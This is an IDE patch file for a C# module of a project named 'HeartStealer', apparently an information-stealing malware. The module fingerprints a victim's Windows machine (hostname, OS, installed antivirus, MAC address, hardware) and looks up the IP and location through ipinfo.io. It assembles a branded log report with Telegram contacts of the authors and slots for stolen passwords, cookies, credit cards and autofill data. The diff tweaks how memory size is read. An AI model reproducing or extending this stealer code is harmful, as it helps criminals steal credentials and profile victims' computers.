@@ -1,0 +1,54 @@
+Index: HeartStealer/Services/Template.cs
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.BaseRevisionTextPatchEP
+<+>using System;\r\nusing System.Text;\r\nusing HeartStealer.Classes;\r\nusing System.IO;\r\nusing System.Net;\r\nusing System.Text;\r\nusing Microsoft.Win32;\r\nusing System.Net.NetworkInformation;\r\nusing System.Management;\r\nusing System.Diagnostics;\r\n\r\nnamespace HeartStealer.Services\r\n{\r\n    // This is a template class that extends IService and shows how it works\r\n    public class Template : IService\r\n    {\r\n        // This variable contains base directory name so the structure of resulting\r\n        // zip-archive will be ../Test/{files}\r\n        \r\n        public override string BaseDirectory => \"Test\";\r\n        \r\n        public override LogRecord[] Collect()\r\n        {\r\n            string username = Environment.MachineName;\r\n            string bits = Environment.Is64BitOperatingSystem ? \" x64\" : \" x32\";\r\n            string win = GetWinV() + bits;\r\n            string av = GetAv();\r\n            string mac = GetMac();\r\n            string ram = GetRam();\r\n            string gpu = GetGPU();\r\n            string cpu = GetCPU();\r\n            string json;\r\n            DateTime now = DateTime.Now;\r\n            string date = now.ToString(\"MM.dd.yyyy HH:mm\");\r\n            using (WebClient client = new WebClient())\r\n            {\r\n                json = client.DownloadString(\"https://ipinfo.io/json\");\r\n            }\r\n\r\n            string ip = ParseJson(json, \"ip\");\r\n            string country = ParseJson(json, \"country\");\r\n            string city = ParseJson(json, \"city\");\r\n            string postal = ParseJson(json, \"postal\");\r\n            \r\n            string report = $@\"\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\r\n\uD83D\uDC96     ██╗  ██╗███████╗ █████╗ ██████╗ ████████╗  \uD83D\uDC96\r\n\uD83D\uDC96     ██║  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝  \uD83D\uDC96\r\n\uD83D\uDC96     ███████║█████╗  ███████║██████╔╝   ██║     \uD83D\uDC96\r\n\uD83D\uDC96     ██╔══██║██╔══╝  ██╔══██║██╔══██╗   ██║     \uD83D\uDC96\r\n\uD83D\uDC96     ██║  ██║███████╗██║  ██║██║  ██║   ██║     \uD83D\uDC96\r\n\uD83D\uDC96     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝     \uD83D\uDC96\r\n\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\uD83D\uDC96\r\n======================================\r\nCoders: https://t.me/reyvortex, https://t.me/TheDyer \r\nинфо про кодеров\r\n=====Geo Data=====\r\nIP: {ip}\r\nCountry: {country}\r\nCity: {city}\r\nPostal: {postal}\r\nMAC: {mac}\r\n=====PC Info=====\r\nUsername: {username}\r\nWin: {win}\r\nGPU: {gpu}\r\nCPU: {cpu}\r\nRAM: {ram}\r\n=====Grabb Info=====\r\nPasswords: \r\nCookies:\r\nCC:\r\nAutoFills:\r\nTAGS:\r\n=====Other=====\r\n{av}\r\nDate: {date}\r\n\";\r\n            return new[]\r\n            {\r\n                new LogRecord\r\n                {\r\n                    \r\n                    Path = \"Information.txt\", // Creates file in such location ../Test/File.txt\r\n                    Content = Encoding.UTF8.GetBytes(report)\r\n                }\r\n            };\r\n            \r\n        }\r\n\r\n        static string GetWinV()\r\n        {\r\n            string ver = Registry.GetValue(@\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\", \"ProductName\", \"\").ToString();\r\n            return ver;\r\n        }\r\n\r\n        static string ParseJson(string json, string key)\r\n        {\r\n            try\r\n            {\r\n                int sindex = json.IndexOf($\"\\\"{key}\\\":\") + key.Length + 3;\r\n                int eindex = json.IndexOf(\"\\\"\", sindex);\r\n                return json.Substring(sindex, eindex - sindex);\r\n            }\r\n            catch\r\n            {\r\n                return \"Unknown\";\r\n            }\r\n        }\r\n        static string GetAv()\r\n        {\r\n            ManagementObjectSearcher searcher = new ManagementObjectSearcher(\"root\\\\SecurityCenter2\", \"SELECT * FROM AntivirusProduct\");\r\n            ManagementObjectCollection av = searcher.Get();\r\n            string antivirus = \"Antivirus: \";\r\n            int cout = 0;\r\n            foreach (ManagementObject o in av)\r\n            {\r\n                string productname = o[\"displayName\"].ToString();\r\n                if (cout > 0)\r\n                {\r\n                    antivirus += \", \";\r\n                }\r\n                antivirus += productname;\r\n                cout++;\r\n            }\r\n            return antivirus;\r\n        }\r\n\r\n        static string GetMac()\r\n        {\r\n            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())\r\n            {\r\n                if (nic.OperationalStatus == OperationalStatus.Up)\r\n                {\r\n                    PhysicalAddress phys = nic.GetPhysicalAddress();\r\n                    byte[] bytes = phys.GetAddressBytes();\r\n                    string mac = \"\";\r\n                    for (int i = 0; i < bytes.Length; i++)\r\n                    {\r\n                        mac += bytes[i].ToString(\"X2\");\r\n                        if (i != bytes.Length - 1)\r\n                        {\r\n                            mac += \":\";\r\n                        }\r\n                    }\r\n\r\n                    return mac;\r\n                }\r\n            }\r\n\r\n            return \"Unknown\";\r\n        }\r\n\r\n        static string GetRam()\r\n        {\r\n            PerformanceCounter total = new PerformanceCounter(\"Memory\", \"Total Bytes\");\r\n            PerformanceCounter used = new PerformanceCounter(\"Memory\", \"Committed Bytes\");\r\n            long totalram = (long)total.NextValue();\r\n            long usedram = (long)used.NextValue();\r\n            double gbtotal = totalram / (1024 * 1024 * 1024.0);\r\n            double gbused = usedram / (1024 * 1024 * 1024.0);\r\n            return gbused + \" GB / \" + gbtotal + \" GB\";\r\n        }\r\n\r\n        static string GetGPU()\r\n        {\r\n            ManagementObjectSearcher searcher = new ManagementObjectSearcher(\"SELECT * FROM Win32_VideoController\");\r\n            foreach (ManagementObject obj in searcher.Get())\r\n            {\r\n                return obj[\"Name\"].ToString();\r\n            }\r\n            return \"Unknown\";\r\n        }\r\n\r\n        static string GetCPU()\r\n        {\r\n            ManagementObjectSearcher searcher = new ManagementObjectSearcher(\"SELECT * FROM Win32_Processor\");\r\n            foreach (ManagementObject obj in searcher.Get())\r\n            {\r\n                return obj[\"Name\"].ToString();\r\n            }\r\n            return \"Unknown\";\r\n        }\r\n    }\r\n}
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/HeartStealer/Services/Template.cs b/HeartStealer/Services/Template.cs
+--- a/HeartStealer/Services/Template.cs	(revision 5c9955f70ef0b39e3a99b16e813b4504a865bb86)
++++ b/HeartStealer/Services/Template.cs	(date 1687968177487)
+@@ -8,6 +8,7 @@
+ using System.Net.NetworkInformation;
+ using System.Management;
+ using System.Diagnostics;
++using System.Runtime.InteropServices;
+ 
+ namespace HeartStealer.Services
+ {
+@@ -17,7 +18,7 @@
+         // This variable contains base directory name so the structure of resulting
+         // zip-archive will be ../Test/{files}
+         
+-        public override string BaseDirectory => "Test";
++        public override string BaseDirectory => string.Empty;
+         
+         public override LogRecord[] Collect()
+         {
+@@ -152,13 +153,19 @@
+ 
+         static string GetRam()
+         {
+-            PerformanceCounter total = new PerformanceCounter("Memory", "Total Bytes");
+-            PerformanceCounter used = new PerformanceCounter("Memory", "Committed Bytes");
+-            long totalram = (long)total.NextValue();
+-            long usedram = (long)used.NextValue();
+-            double gbtotal = totalram / (1024 * 1024 * 1024.0);
+-            double gbused = usedram / (1024 * 1024 * 1024.0);
+-            return gbused + " GB / " + gbtotal + " GB";
++            ObjectQuery q = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
++            ManagementObjectSearcher searcher = new ManagementObjectSearcher(q);
++            ManagementObjectCollection r = searcher.Get();
++            foreach (ManagementObject rr in r)
++            {
++                ulong totalram = Convert.ToUInt64(rr["TotalVisibleMemorySize"]);
++                ulong usedram = Convert.ToUInt64(rr["FreePhysicalMemory"]);
++                double gbtotal = totalram / (1024d * 1024d);
++                double gbused = (totalram - usedram) / (1024d * 1024d);
++                return $"{gbused} GB /  {gbtotal} GB";
++            }
++
++            return "Unknown";
+         }
+ 
+         static string GetGPU()
